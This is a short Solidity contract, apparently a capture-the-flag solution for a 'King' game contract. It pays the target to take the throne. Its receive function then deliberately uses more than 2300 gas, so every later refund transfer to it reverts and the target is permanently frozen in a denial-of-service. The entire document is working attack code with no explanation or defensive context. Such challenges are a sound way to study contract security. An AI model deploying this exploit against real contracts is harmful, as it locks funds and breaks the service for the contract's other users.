
contract AttackerKing {
    address kingContract;

    constructor(address _kingContract) payable {
        kingContract = _kingContract;
    }

    function attack() public payable {
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "King contract call failed");
    }

    receive() external payable {
        // Consume more than 2300 gas to prevent transfer
        uint256 x = 0;
        for (uint256 i = 0; i < 1000; i++) {
            x += i;
        }
    }
}
